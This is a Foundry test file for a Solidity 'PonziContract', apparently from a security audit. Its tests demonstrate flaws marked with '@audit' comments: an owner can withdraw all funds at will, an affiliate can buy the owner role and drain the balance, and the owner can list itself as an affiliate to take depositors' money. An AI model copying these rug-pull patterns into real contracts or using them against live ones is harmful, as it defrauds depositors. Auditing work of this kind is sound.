// SPDX-License-Identifier: UNLICENSED
pragma solidity =0.8.19;

import "forge-std/Test.sol";
import {PonziContract} from "../src/PonziContract/PonziContract.sol";

contract PonziContractTest is Test {
    PonziContract ponziContract;
    address person1 = vm.addr(1);
    address person2 = vm.addr(2);
    address person3 = vm.addr(3);
    address owner = vm.addr(4);

    uint256 ETHER_TO_TRANSFER = 10 ether;

    function setUp() external {
        vm.startPrank(owner);
        ponziContract = new PonziContract();
        vm.stopPrank();
        vm.deal(address(person1), ETHER_TO_TRANSFER);
        vm.deal(address(person2), ETHER_TO_TRANSFER);
        vm.deal(address(person3), ETHER_TO_TRANSFER);
        vm.deal(address(ponziContract), ETHER_TO_TRANSFER);
    }

    function testDeploy() public {
        assertEq(address(person1).balance, ETHER_TO_TRANSFER);
    }

    function testsetDeadline() public {
        uint256 DEADLINE = 2000;
        vm.startPrank(owner);
        // vm.expectEmit(DEADLINE);
        ponziContract.setDeadline(DEADLINE);
    }

    function testOwnerWithdraw() public { // @audit rugpull
        uint256 multiplier = 2;

        vm.startPrank(person1);
        address ponziContractAddress = address(ponziContract);
        assertEq(ponziContractAddress.balance, ETHER_TO_TRANSFER);
        assertEq(owner.balance, 0);

        ponziContractAddress.call{value: ETHER_TO_TRANSFER}("");
        assertEq(ponziContractAddress.balance, ETHER_TO_TRANSFER * multiplier);
        changePrank(owner);
        // Owner can withdraw money in anytime
        ponziContract.ownerWithdraw(address(owner), ponziContractAddress.balance);
        assertEq(owner.balance, ETHER_TO_TRANSFER * multiplier);
    }

    function testBuyOwnerRole() public { // @audit risk of stealing owners rigths
        uint256 multiplier = 2;
        vm.startPrank(owner);
        ponziContract.addNewAffilliate(address(person1));
        assertEq(ponziContract.owner(), address(owner));
        assertEq(address(person1).balance, ETHER_TO_TRANSFER);

        changePrank(person1);
        // person1 buying contract owner position
        ponziContract.buyOwnerRole{value: ETHER_TO_TRANSFER}(address(person1));
        assertEq(ponziContract.owner(), address(person1));
        // person1 withdraw funds from contract.
        ponziContract.ownerWithdraw(address(person1), address(ponziContract).balance);
        assertEq(address(person1).balance, ETHER_TO_TRANSFER * multiplier);
        vm.stopPrank();
    }

    function testJoinPonzi() public {
        uint256 timestamp = 100000;
        uint256 deadlineRevert = 50000;
        uint256 deadlineOk = 200000;
        vm.warp(timestamp);
        console.log("COUNT: ", ponziContract.affiliatesCount());
        console.log("Contract balance: ", address(ponziContract).balance);
        console.log("Person1 balance: ", address(person1).balance);
        assertEq(address(person1).balance, ETHER_TO_TRANSFER);
        assertEq(address(person2).balance, ETHER_TO_TRANSFER);
        assertEq(address(person3).balance, ETHER_TO_TRANSFER);

        vm.startPrank(owner);
        ponziContract.setDeadline(deadlineRevert);
        ponziContract.addNewAffilliate(address(person1));
        ponziContract.addNewAffilliate(address(person2));
        ponziContract.addNewAffilliate(address(person3));

        changePrank(person1);

        address[] memory affilatesArray = new address[](3);
        affilatesArray[0] = address(person1);
        affilatesArray[1] = address(person2);
        affilatesArray[2] = address(person3);

        vm.expectRevert("Registration not Active!");
        ponziContract.joinPonzi(affilatesArray);

        changePrank(owner);
        ponziContract.setDeadline(deadlineOk);

        // Person1 deposit 3 ether, but lost 2 of them.
        changePrank(person1);
        ponziContract.joinPonzi{value: 3 ether}(affilatesArray);
        assertEq(address(person1).balance, 8 ether);

        console.log("Contract balance after: ", address(ponziContract).balance);
        console.log("Person1 balance after: ", address(person1).balance);

    }

    function testJoinPonziOwnerScam() public {
        uint256 deadlineOk = 2000;
        vm.startPrank(owner);
        ponziContract.setDeadline(deadlineOk);
        ponziContract.addNewAffilliate(address(person1));
        ponziContract.addNewAffilliate(address(owner));
        ponziContract.addNewAffilliate(address(owner));

        changePrank(person1);

        address[] memory affilatesArray = new address[](3);
        affilatesArray[0] = address(person1);
        affilatesArray[1] = address(owner);
        affilatesArray[2] = address(owner);

        // Person1 deposit 3 ether, but lost 2 of them.
        changePrank(person1);
        assertEq(address(owner).balance, 0);
        ponziContract.joinPonzi{value: 3 ether}(affilatesArray);

        assertEq(address(person1).balance, 8 ether);
        assertEq(address(owner).balance, 2 ether);

        changePrank(owner);
        ponziContract.ownerWithdraw(owner, 2 ether);
        assertEq(address(owner).balance, 4 ether);
    }
}